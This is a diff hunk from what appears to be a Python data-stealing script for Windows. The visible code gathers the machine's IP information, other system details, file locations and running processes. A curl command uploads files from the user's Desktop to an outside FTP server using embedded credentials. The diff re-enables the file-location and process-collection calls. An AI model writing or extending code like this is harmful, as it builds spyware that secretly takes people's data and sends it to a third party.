@@ -129,11 +129,11 @@ if platform.system() == "Windows":
             os.system(f"curl -v -u {USERNAME}:{PASSWORD} -T {home}\\Desktop\\Test\\{lst[i]} ftp://epiz_32211127@ftpupload.net/htdocs/IPUPLOAD/")
     
     test()
-    #fileloc()
+    fileloc()
     ipinfo(ipreq(ipgrabber()))
     otherinfo()
     upload_ftp()
-    #currunproc()
+    currunproc()
 
 else:
     raise SystemExit
